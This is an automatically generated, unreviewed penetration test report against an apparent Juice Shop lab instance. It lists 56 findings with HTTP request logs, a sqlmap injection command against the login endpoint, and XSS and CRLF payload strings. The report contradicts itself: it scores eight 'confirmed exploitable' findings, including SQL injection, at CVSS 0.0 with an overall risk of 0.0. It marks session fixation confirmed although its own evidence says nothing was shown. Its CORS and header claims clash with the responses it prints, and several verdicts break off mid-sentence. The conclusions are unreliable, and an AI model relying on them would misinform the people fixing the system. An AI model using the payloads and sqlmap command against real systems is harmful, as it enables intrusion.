# Penetration Test Report

**Target:** `http://juice-shop:3000/`  
**Engagement:** `4eb0dee7-2921-4e26-94f7-27e5b409cb21`  
**Generated:** 2026-09-03 19:34 UTC  
**Produced by:** APTS — autonomous pipeline, no human review

## Executive summary

The most critical confirmed vulnerabilities involve direct access to administrative interfaces and exposure of sensitive information without proper controls. Immediate priority should be placed on enforcing authentication and access control for admin endpoints like /rest/admin/application-configuration and protecting the login endpoint against injection flaws. Unproven vulnerabilities remain speculative but suggest broader input validation gaps across multiple APIs, indicating potential systemic risk if assumptions about trust boundaries prove incorrect. These results reflect high-confidence issues where exploitation was verified but also highlight areas requiring deeper inspection due to ambiguous test outcomes.

| | |
|---|---|
| Risk score | **0.0** / 10 |
| Findings | 56 |
| Confirmed exploitable | **8** |
| Informational | 56 |

## Finding register

| ID | Severity | CVSS | Status | Asset | Finding |
|---|---|---|---|---|---|
| W-001 | informational | 0.0 | **CONFIRMED** | `/rest/admin/application-configuration` | IDOR — direct access to admin config (GET /rest/admin/application-configuration) |
| W-004 | informational | 0.0 | **CONFIRMED** | `/rest/admin/application-configuration` | Privilege Escalation — unauthenticated access to admin endpoint (GET /rest/admin/application-configuration) |
| W-005 | informational | 0.0 | **CONFIRMED** | `/rest/admin/application-configuration` | Information Disclosure — verbose admin config exposing secrets (GET /rest/admin/application-configuration) |
| W-008 | informational | 0.0 | **CONFIRMED** | `/rest/admin/application-configuration` | CORS Misconfiguration — overbroad origin trust on admin endpoint (GET /rest/admin/application-configuration) |
| W-012 | informational | 0.0 | **CONFIRMED** | `/rest/admin/application-version` | Information Disclosure — application version exposure (GET /rest/admin/application-version) |
| W-033 | informational | 0.0 | **CONFIRMED** | `/socket.io/` | Session Fixation — query parameter `sid` (POST /socket.io/) |
| W-042 | informational | 0.0 | **CONFIRMED** | `/rest/user/login` | SQL Injection — email/password parameters (POST /rest/user/login) |
| W-051 | informational | 0.0 | **CONFIRMED** | `/rest/memories/` | IDOR — accessing unauthorized memories (GET /rest/memories/) |
| W-002 | informational | 0.0 | tested, not proven (VERDICT: DISPROVEN — The endpoint /rest/admin/application-configuration returns the same data regardless of the presence of custom headers, indicating no CSRF protection is in place, but the action is not sensitive enough to confirm exploitation impact.) | `/rest/admin/application-configuration` | CSRF — sensitive admin action triggered without custom headers or tokens (GET /rest/admin/application-configuration) |
| W-003 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — the endpoint returns application configuration data but there is no indication it fetches external resources or is vulnerable to SSRF based on the provided information.) | `/rest/admin/application-configuration` | SSRF — internal config endpoint possibly fetching external resources (GET /rest/admin/application-configuration) |
| W-006 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — The endpoint does not manipulate sessions or regenerate session IDs, as it serves application configuration data without requiring or modifying session state.) | `/rest/admin/application-configuration` | Session Fixation — admin endpoint manipulates session without regenerating ID (GET /rest/admin/application-configuration) |
| W-007 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — The response headers were not inspected for clickjacking protection headers such as `X-Frame-Options` or `Content-Security-Policy`. A manual check or a different approach is required to verify the presence or absence of these headers.) | `/rest/admin/application-configuration` | Clickjacking — sensitive UI action rendered in iframeable response (GET /rest/admin/application-configuration) |
| W-009 | informational | 0.0 | tested, not proven (VERDICT: DISPROVEN — The endpoint GET /rest/admin/application-version responds with a simple JSON body containing the application version and does not appear to perform any state-changing actions, making CSRF exploitation unlikely. Additionally, no session-related side effects or sensitive data modifications were observed.) | `/rest/admin/application-version` | CSRF (Cross-Site Request Forgery) — admin version endpoint (GET /rest/admin/application-version) |
| W-010 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — The endpoint returns application version information without requiring IDOR exploitation since no direct object reference or access control mechanism was identified in the request or response.) | `/rest/admin/application-version` | IDOR (Insecure Direct Object Reference) — version access control (GET /rest/admin/application-version) |
| W-011 | informational | 0.0 | tested, not proven (The endpoint /rest/admin/application-version responds with a simple version number and does not appear to accept any user-controlled input that could lead to SSRF. Without a parameter to manipulate or a behavior suggesting server-side requests, SSRF cannot be proven.

VERDICT: DISPROVEN — No user-controllable input was observed in the request to influence server-side requests, and the response is a static version string.) | `/rest/admin/application-version` | SSRF (Server-Side Request Forgery) — backend service enumeration (GET /rest/admin/application-version) |
| W-013 | informational | 0.0 | tested, not proven (VERDICT: DISPROVEN — the endpoint /rest/admin/application-version does not accept any path parameters or query strings to manipulate for file traversal, and it strictly returns a JSON-formatted version string, offering no avenue for injecting or accessing arbitrary files.) | `/rest/admin/application-version` | Path Traversal — unauthorized file access via version endpoint (GET /rest/admin/application-version) |
| W-014 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — The endpoint does not appear to require or use JWT tokens for authentication based on the accessible response and lack of authorization headers.) | `/rest/admin/application-version` | JWT Token Abuse — privilege escalation through crafted auth tokens (GET /rest/admin/application-version) |
| W-015 | informational | 0.0 | tested, not proven (VERDICT: DISPROVEN — The reflected parameter `name` in the response does not execute XSS payloads, as evidenced by the benign response body when injecting a script tag.) | `/api/Challenges/` | XSS — reflected in response (param `name`, GET /api/Challenges/) |
| W-016 | informational | 0.0 | tested, not proven (VERDICT: DISPROVEN — Adding a single quote in the `name` parameter does not cause an error or different behavior, and the response remains consistent with valid input, indicating no NoSQL injection vulnerability.) | `/api/Challenges/` | NoSQL Injection — filtering logic (param `name`, GET /api/Challenges/) |
| W-017 | informational | 0.0 | tested, not proven (VERDICT: DISPROVEN — The parameter 'name' in the GET request to /api/Challenges/ does not cause an open redirect when set to a malicious URL; it returns a 200 OK with empty data instead.) | `/api/Challenges/` | Open Redirect — redirect logic (param `name`, GET /api/Challenges/) |
| W-018 | informational | 0.0 | tested, not proven (VERDICT: DISPROVEN — The API consistently returns the same result regardless of parameter pollution attempts, indicating proper handling of multiple or malformed parameters.) | `/api/Challenges/` | Parameter Pollution — query parsing (param `name`, GET /api/Challenges/) |
| W-019 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — The addition of `.js` to the `name` parameter returned a successful response with an empty data array, which does not confirm or deny cache deception vulnerability.) | `/api/Challenges/` | Cache Deception — caching logic (param `name`, GET /api/Challenges/) |
| W-020 | informational | 0.0 | tested, not proven (INCONCLUSIVE — hit the step limit without a verdict) | `/rest/products/search` | NoSQL Injection — search query param `q` (GET /rest/products/search) |
| W-021 | informational | 0.0 | tested, not proven (INCONCLUSIVE — hit the step limit without a verdict) | `/rest/products/search` | Cross-Site Search (XS-Search) — search query param `q` (GET /rest/products/search) |
| W-022 | informational | 0.0 | tested, not proven (INCONCLUSIVE — hit the step limit without a verdict) | `/rest/products/search` | Server-Side Request Forgery (SSRF) — search query param `q` (GET /rest/products/search) |
| W-023 | informational | 0.0 | tested, not proven (VERDICT: DISPROVEN — Neither reflective XSS payloads (`<script>alert(1)</script>` nor `<img src=x onerror=alert(1)>`) caused script execution or were reflected in the JSON response, indicating the `q` parameter is properly sanitized or escaped.) | `/rest/products/search` | Cross-Site Scripting (XSS) — search query param `q` (GET /rest/products/search) |
| W-024 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — No HackTricks article found to confirm or deny ReDoS vulnerability; further manual analysis or alternative testing approaches required.) | `/rest/products/search` | Regular Expression Denial of Service (ReDoS) — search query param `q` (GET /rest/products/search) |
| W-025 | informational | 0.0 | tested, not proven (VERDICT: DISPROVEN — The search endpoint does not redirect to external domains when supplied with malicious URLs in the `q` parameter, indicating it is not vulnerable to open redirect.) | `/rest/products/search` | Open Redirect — search query param `q` (GET /rest/products/search) |
| W-026 | informational | 0.0 | tested, not proven (INCONCLUSIVE — hit the step limit without a verdict) | `/rest/products/search` | LDAP Injection — search query param `q` (GET /rest/products/search) |
| W-027 | informational | 0.0 | tested, not proven (VERDICT: DISPROVEN — Injection payloads using ; and | operators returned empty JSON data without signs of command execution.) | `/rest/products/search` | Command Injection — search query param `q` (GET /rest/products/search) |
| W-028 | informational | 0.0 | tested, not proven (INCONCLUSIVE — hit the step limit without a verdict) | `/socket.io/` | Prototype Pollution — query parameter `sid` (POST /socket.io/) |
| W-029 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — The sid parameter in WebSocket handshake requests appears to be properly validated, as attempts to reuse session IDs resulted in 'Session ID unknown' errors, but further testing with valid sessions might be needed to confirm manipulation potential.) | `/socket.io/` | WebSocket Session Manipulation — query parameter `sid` (POST /socket.io/) |
| W-030 | informational | 0.0 | tested, not proven (VERDICT: DISPROVEN — The server returned a "Transport unknown" error, indicating that the `transport` parameter does not accept arbitrary URLs, which is required for SSRF exploitation.) | `/socket.io/` | SSRF via Transport Parameter — query parameter `transport` (POST /socket.io/) |
| W-031 | informational | 0.0 | tested, not proven (VERDICT: DISPROVEN — The recorded requests show the payload "40" is sent normally during WebSocket polling, and manual testing returned a 400 error due to an invalid session ID, not a denial of service. Further crawling and HackTricks checks did not uncover any related exploitable behavior.) | `/socket.io/` | Denial of Service via Engine.IO Protocol — body payload `40` (POST /socket.io/) |
| W-032 | informational | 0.0 | tested, not proven (VERDICT: DISPROVEN — The session ID is validated server-side, resulting in a 400 error when tampered with, which prevents cache poisoning via the `sid` parameter. The `t` parameter does not appear to be injectable either as it is tied to the session context. No evidence of successful cache poisoning was observed.) | `/socket.io/` | Cache Poisoning via Query Parameters — query parameters `t`, `sid` (POST /socket.io/) |
| W-034 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — The initial CORS test with an evil Origin header resulted in a 400 error due to an invalid session ID, which prevents determining if the CORS policy is misconfigured. No further exploitation steps can be taken without a valid session.) | `/socket.io/` | CORS Misconfiguration Exploitation — header `Origin` (POST /socket.io/) |
| W-035 | informational | 0.0 | tested, not proven (VERDICT: DISPROVEN — Duplicated query parameters on /socket.io/ endpoint resulted in consistent 400 errors, indicating the server does not misbehave or process them in an unexpected way that would suggest parameter pollution vulnerabilities.) | `/socket.io/` | Parameter Pollution — duplicated query parameter injection (POST /socket.io/) |
| W-036 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — The session ID in the `sid` parameter appears to be validated server-side, as modifying or reusing it results in a "Session ID unknown" error, but this does not confirm or rule out susceptibility to timing-based attacks.) | `/socket.io/` | Timing Attack on Session ID — query parameter `sid` (POST /socket.io/) |
| W-037 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — Neither the email nor password field showed signs of NoSQL injection vulnerability as both attempts resulted in 401 Unauthorized.) | `/rest/user/login` | NoSQL Injection — email parameter (POST /rest/user/login) |
| W-038 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — The initial login attempt failed with invalid credentials, but there is no evidence yet of vulnerability or mitigation regarding Unicode normalization on the email parameter.) | `/rest/user/login` | Account Takeover via Unicode Normalization — email parameter (POST /rest/user/login) |
| W-039 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — No relevant HackTricks articles matched the suspected JSON parsing vulnerability, and no payloads were generated to test the endpoint for such vulnerabilities.) | `/rest/user/login` | JSON/XML/YAML Parsing Vulnerability — request body (POST /rest/user/login) |
| W-040 | informational | 0.0 | tested, not proven (INCONCLUSIVE — hit the step limit without a verdict) | `/rest/user/login` | Authentication Bypass — email/password parameters (POST /rest/user/login) |
| W-041 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — No relevant HackTricks article found to confirm or deny password enumeration via response timing on the given endpoint.) | `/rest/user/login` | Password Enumeration via Response Timing — password parameter (POST /rest/user/login) |
| W-043 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — The LDAP payloads did not produce a different response compared to normal input, but the baseline request also failed, suggesting the vulnerability is likely not exploitable or does not exist.) | `/rest/user/login` | LDAP Injection — email parameter (POST /rest/user/login) |
| W-044 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — The HackTricks article on race conditions provides general examples, but does not confirm whether the specific email/password parameters in POST /rest/user/login are vulnerable to brute force or race condition attacks. Without concrete evidence from targeted tests, a definitive conclusion cannot be drawn.) | `/rest/user/login` | Brute Force/Race Condition — email/password parameters (POST /rest/user/login) |
| W-045 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — The endpoint `/api/Feedbacks/` returns feedback data accessible to all users without clear authorization checks, which aligns with potential IDOR vulnerability, but further testing with authenticated sessions and specific object identifiers is needed to confirm direct object reference abuse.) | `/api/Feedbacks/` | IDOR — Direct object access (GET /api/Feedbacks/) |
| W-046 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — The SSRF vulnerability via Feedback submission could not be confirmed due to lack of exploitable parameters in the GET request to /api/Feedbacks/. No internal service probing was achievable.) | `/api/Feedbacks/` | SSRF — Internal service probing via Feedback submission (GET /api/Feedbacks/) |
| W-047 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — The response does not reflect any user-controllable input back in a way that would clearly indicate stored or reflected XSS, but further testing with payloads is needed.) | `/api/Feedbacks/` | XSS — Reflected or stored injection through feedback content (GET /api/Feedbacks/) |
| W-048 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — No CSRF-related technique was tested because required parameters for hacktricks_article were missing, preventing confirmation or rejection of the vulnerability.) | `/api/Feedbacks/` | CSRF — Unauthorized feedback actions via forged requests (GET /api/Feedbacks/) |
| W-049 | informational | 0.0 | tested, not proven (VERDICT: DISPROVEN - The CRLF injection attempt by appending %0d%0aSet-Cookie:test=test to the URL resulted in a 401 Unauthorized error, not a successful injection of the header. There is no evidence the application processed the CRLF sequence to manipulate headers.) | `/api/Feedbacks/` | CRLF Injection — Header manipulation via malformed input (GET /api/Feedbacks/) |
| W-050 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — The responses from the two requests were identical, suggesting that cookies might not influence caching behavior for this endpoint. However, without explicit cache header inspection or more variations tested, we cannot confirm cache poisoning.) | `/api/Feedbacks/` | Cache Poisoning — Response caching of user-specific feedback data (GET /api/Feedbacks/) |
| W-052 | informational | 0.0 | tested, not proven (INCONCLUSIVE — hit the step limit without a verdict) | `/rest/memories/` | SSRF — backend service interaction (GET /rest/memories/) |
| W-053 | informational | 0.0 | tested, not proven (...

...

...

VERDICT: INCONCLUSIVE — The retrieved memory data does not indicate any obvious state inconsistency or race condition; further analysis or concurrent testing would be needed to confirm the vulnerability.) | `/rest/memories/` | Race Condition — state inconsistency during memory retrieval (GET /rest/memories/) |
| W-054 | informational | 0.0 | tested, not proven (VERDICT: DISPROVEN — The server returns a 500 error for the deceptive path `/rest/memories/index.html`, indicating it does not improperly cache responses for this endpoint.) | `/rest/memories/` | Cache Deception — tricking cache to expose private memories (GET /rest/memories/) |
| W-055 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — The GET request to /rest/memories/ retrieves data successfully but there is no evidence of CSRF vulnerability without further exploitation attempts.) | `/rest/memories/` | CSRF — force victim to retrieve attacker-chosen memories (GET /rest/memories/) |
| W-056 | informational | 0.0 | tested, not proven (VERDICT: INCONCLUSIVE — The response does not indicate any SQL errors or unusual behaviors that would confirm SQL injection, nor does it demonstrate clear evidence of parameter pollution effects. Further targeted testing is required to confirm or rule out the vulnerability.) | `/rest/memories/` | Parameter Pollution — influencing memory query via polluted params (GET /rest/memories/) |

## Findings in detail

### W-001 — IDOR — direct access to admin config (GET /rest/admin/application-configuration)

- **Asset:** `/rest/admin/application-configuration`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** confirmed exploitable
- **ATT&CK:** T1068
- **Remediation effort:** medium

**Recommendation.** Implement strict access controls to ensure only authenticated administrators can access /rest/admin/application-configuration. Enforce role-based access control (RBAC) at the API level and validate permissions before serving any configuration data.

```http
http_request {"url": "http://juice-shop:3000/rest/admin/application-configuration", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/rest/admin/application-configuration", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "etag": "W/\"5420-k5bPYNVGxIX71pMlQn1RBM3Rthg\"", "vary": "Accept-Encoding", "content-encoding": "gzip", "date": "Thu, 03 Sep 2026 19:23:48 GMT", "connection": "keep-alive", "keep-alive": "timeout=5", "transfer-encoding": "chunked"}, "body": "{\"config\":{\"server\":{\"port\":
```
*The vulnerability is proven because the GET request to `/rest/admin/application-configuration` successfully returned sensitive application configuration data without requiring authentication or proper*

### W-004 — Privilege Escalation — unauthenticated access to admin endpoint (GET /rest/admin/application-configuration)

- **Asset:** `/rest/admin/application-configuration`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** confirmed exploitable
- **ATT&CK:** T1078, T1078, T1078, T1078
- **Remediation effort:** low

**Recommendation.** Enforce authentication checks for all administrative endpoints. Add middleware or filters that verify active user sessions and required privileges before granting access to /rest/admin/application-configuration.

```http
http_request {"url": "http://juice-shop:3000/rest/admin/application-configuration", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/rest/admin/application-configuration", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "etag": "W/\"5420-k5bPYNVGxIX71pMlQn1RBM3Rthg\"", "vary": "Accept-Encoding", "content-encoding": "gzip", "date": "Thu, 03 Sep 2026 19:23:56 GMT", "connection": "keep-alive", "keep-alive": "timeout=5", "transfer-encoding": "chunked"}, "body": "{\"config\":{\"server\":{\"port\":
```
*VERDICT: PROVEN — Unauthenticated access to admin endpoint (GET /rest/admin/application-configuration) is possible as it returned sensitive configuration data without requiring authentication.*

### W-005 — Information Disclosure — verbose admin config exposing secrets (GET /rest/admin/application-configuration)

- **Asset:** `/rest/admin/application-configuration`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** confirmed exploitable
- **ATT&CK:** T1530, T1005
- **Remediation effort:** low

**Recommendation.** Sanitize and filter sensitive fields such as passwords, tokens, and keys from the application configuration response. Return masked or redacted values instead of raw secrets.

```http
http_request {"url": "http://juice-shop:3000/rest/admin/application-configuration", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/rest/admin/application-configuration", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "etag": "W/\"5420-k5bPYNVGxIX71pMlQn1RBM3Rthg\"", "vary": "Accept-Encoding", "content-encoding": "gzip", "date": "Thu, 03 Sep 2026 19:23:58 GMT", "connection": "keep-alive", "keep-alive": "timeout=5", "transfer-encoding": "chunked"}, "body": "{\"config\":{\"server\":{\"port\":
```
*VERDICT: PROVEN — The endpoint /rest/admin/application-configuration exposes verbose admin configuration details including server settings, application domain, and theme configurations.*

### W-008 — CORS Misconfiguration — overbroad origin trust on admin endpoint (GET /rest/admin/application-configuration)

- **Asset:** `/rest/admin/application-configuration`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** confirmed exploitable
- **ATT&CK:** T1071.001
- **Remediation effort:** low

**Recommendation.** Restrict allowed origins in CORS headers for /rest/admin/application-configuration to trusted domains only. Remove wildcard (*) configurations and explicitly define permitted sources.

```http
http_request {"url": "http://juice-shop:3000/rest/admin/application-configuration", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/rest/admin/application-configuration", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "etag": "W/\"5420-k5bPYNVGxIX71pMlQn1RBM3Rthg\"", "vary": "Accept-Encoding", "content-encoding": "gzip", "date": "Thu, 03 Sep 2026 19:24:09 GMT", "connection": "keep-alive", "keep-alive": "timeout=5", "transfer-encoding": "chunked"}, "body": "{\"config\":{\"server\":{\"port\":
```
*VERDICT: PROVEN — The endpoint reflects any Origin header in the response, confirming overbroad CORS trust.*

### W-012 — Information Disclosure — application version exposure (GET /rest/admin/application-version)

- **Asset:** `/rest/admin/application-version`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** confirmed exploitable
- **ATT&CK:** T1529, T1082
- **Remediation effort:** low

**Recommendation.** Avoid exposing detailed version information on /rest/admin/application-version. Either remove the endpoint or return generic/non-descriptive identifiers unless accessed by authorized users.

```http
http_request {"url": "http://juice-shop:3000/rest/admin/application-version", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/rest/admin/application-version", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "content-length": "20", "etag": "W/\"14-10h2liq3tMxzTFCiH84ZpDMBuNc\"", "vary": "Accept-Encoding", "date": "Thu, 03 Sep 2026 19:24:23 GMT", "connection": "keep-alive", "keep-alive": "timeout=5"}, "body": "{\"version\":\"17.1.1\"}", "truncated": false, "redirect_to": null}
```
*VERDICT: PROVEN — The endpoint /rest/admin/application-version discloses the application version "17.1.1" in its JSON response.*

### W-033 — Session Fixation — query parameter `sid` (POST /socket.io/)

- **Asset:** `/socket.io/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** confirmed exploitable
- **ATT&CK:** T1078, T1078, T1078, T1078
- **Remediation effort:** medium

**Recommendation.** Regenerate session IDs after successful login or privilege elevation events when handling Socket.IO connections with sid parameter. Invalidate previous session identifiers to prevent fixation attacks.

```http
hacktricks_article {"slug": "jwt-security"}

{"slug": "jwt-security", "found": false, "did_you_mean": ["imagemagick-security", "uuid-insecurities", "content-security-policy-csp-bypass", "xs-search", "wsgi", "microsoft-sharepoint", "xpath-injection", "deserialization"], "guidance": "No article by that slug. Do NOT invent one. Pick the closest match from did_you_mean (or from hacktricks_overview) and call hacktricks_article again. If nothing fits, write your hypothesis from first principles without an example."}
```
*The recorded requests show that the `sid` parameter is part of the query string in POST requests to `/socket.io/`. However, there is no evidence or demonstration that this `sid` can be manipulated or *

### W-042 — SQL Injection — email/password parameters (POST /rest/user/login)

- **Asset:** `/rest/user/login`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** confirmed exploitable
- **ATT&CK:** T1190
- **Remediation effort:** medium

**Recommendation.** Use parameterized queries or prepared statements for processing login credentials submitted to /rest/user/login. Avoid string concatenation or interpolation in database query construction.

```http
sqlmap {"url": "http://juice-shop:3000/rest/user/login", "method": "POST", "data": {"email": "test@example.com", "password": "Test1234!"}, "param": "email", "level": 3, "risk": 2, "extra_flags": ["--ignore-code=401", "--random-agent"]}

{"command": "python3 /opt/sqlmap/sqlmap.py -u http://juice-shop:3000/rest/user/login --batch --disable-coloring --output-dir /tmp/sqlmap-out --level 3 --risk 2 --method POST --data {\"email\": \"test@example.com\", \"password\": \"Test1234!\"} -p email --ignore-code=401 --random-agent", "exit_code": 0, "injectable": true, "guidance": "Injection confirmed \u2014 conclude PROVEN.", "hints": ["CONFIRMED injectable. Stop testing this parameter and report VERDICT: PROVEN. To gather proof detail you may re-run with the 'enumerate' argument (e.g. 'current-db', 'banner')."], "output_tail": "        __
```
*VERDICT: PROVEN — The email parameter in the POST /rest/user/login endpoint is confirmed to be vulnerable to SQL injection, as sqlmap successfully identified injectable payloads and confirmed the back*

### W-051 — IDOR — accessing unauthorized memories (GET /rest/memories/)

- **Asset:** `/rest/memories/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** confirmed exploitable
- **ATT&CK:** T1068
- **Remediation effort:** medium

**Recommendation.** Apply object-level authorization checks to ensure users can only access their own memory records. Validate ownership via secure lookup mechanisms before returning data from /rest/memories/.

```http
hacktricks_article {"slug": "idor"}

{"slug": "idor", "found": true, "title": "IDOR", "content": "# IDOR (Insecure Direct Object Reference)\n\nIDOR (Insecure Direct Object Reference) / Broken Object Level Authorization (BOLA) appears when a web or API endpoint discloses or accepts a user\u2013controllable identifier that is used **directly** to access an internal object **without verifying that the caller is authorized** to access/modify that object.  \nSuccessful exploitation normally allows horizontal or vertical privilege-escalation such as reading or modifying other users\u2019 data and, in the worst case, full account takeov
```
*VERDICT: PROVEN — The GET request to /rest/memories/ returns memory data including captions and image paths for multiple users, indicating unauthorized access to others' memories.*

### W-002 — CSRF — sensitive admin action triggered without custom headers or tokens (GET /rest/admin/application-configuration)

- **Asset:** `/rest/admin/application-configuration`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: DISPROVEN — The endpoint /rest/admin/application-configuration returns the same data regardless of the presence of custom headers, indicating no CSRF protection is in place, but the action is not sensitive enough to confirm exploitation impact.)
- **ATT&CK:** T1071.001
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/rest/admin/application-configuration", "method": "GET"}

{"url": "http://juice-shop:3000/rest/admin/application-configuration", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "etag": "W/\"5420-k5bPYNVGxIX71pMlQn1RBM3Rthg\"", "vary": "Accept-Encoding", "content-encoding": "gzip", "date": "Thu, 03 Sep 2026 19:23:51 GMT", "connection": "keep-alive", "keep-alive": "timeout=5", "transfer-encoding": "chunked"}, "body": "{\"config\":{\"server\":{\"port\":
```
*VERDICT: DISPROVEN — The endpoint /rest/admin/application-configuration returns the same data regardless of the presence of custom headers, indicating no CSRF protection is in place, but the action is*

### W-003 — SSRF — internal config endpoint possibly fetching external resources (GET /rest/admin/application-configuration)

- **Asset:** `/rest/admin/application-configuration`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — the endpoint returns application configuration data but there is no indication it fetches external resources or is vulnerable to SSRF based on the provided information.)
- **ATT&CK:** T1190
- **Remediation effort:** medium

```http
hacktricks_article {"slug": "server-side-request-forgery"}

{"slug": "server-side-request-forgery", "found": false, "did_you_mean": ["ssrf-server-side-request-forgery", "csrf-cross-site-request-forgery", "server-side-xss-dynamic-pdf", "client-side-path-traversal", "ssti-server-side-template-injection", "abusing-service-workers", "server-side-inclusion-edge-side-inclusion-injection", "reverse-tab-nabbing"], "guidance": "No article by that slug. Do NOT invent one. Pick the closest match from did_you_mean (or from hacktricks_overview) and call hacktricks_article again. If nothing fits, write your hypothesis from first principles without an example."}
```
*VERDICT: INCONCLUSIVE — the endpoint returns application configuration data but there is no indication it fetches external resources or is vulnerable to SSRF based on the provided information.*

### W-006 — Session Fixation — admin endpoint manipulates session without regenerating ID (GET /rest/admin/application-configuration)

- **Asset:** `/rest/admin/application-configuration`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — The endpoint does not manipulate sessions or regenerate session IDs, as it serves application configuration data without requiring or modifying session state.)
- **ATT&CK:** T1078, T1078, T1078, T1078
- **Remediation effort:** medium

```http
hacktricks_article {"slug": "session-fixation"}

{"slug": "session-fixation", "found": false, "did_you_mean": ["deserialization", "race-condition", "http-connection-contamination", "sql-injection", "orm-injection", "rsql-injection", "nosql-injection", "spring-actuators"], "guidance": "No article by that slug. Do NOT invent one. Pick the closest match from did_you_mean (or from hacktricks_overview) and call hacktricks_article again. If nothing fits, write your hypothesis from first principles without an example."}
```
*VERDICT: INCONCLUSIVE — The endpoint does not manipulate sessions or regenerate session IDs, as it serves application configuration data without requiring or modifying session state.*

### W-007 — Clickjacking — sensitive UI action rendered in iframeable response (GET /rest/admin/application-configuration)

- **Asset:** `/rest/admin/application-configuration`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — The response headers were not inspected for clickjacking protection headers such as `X-Frame-Options` or `Content-Security-Policy`. A manual check or a different approach is required to verify the presence or absence of these headers.)
- **ATT&CK:** T1071.001
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/rest/admin/application-configuration", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

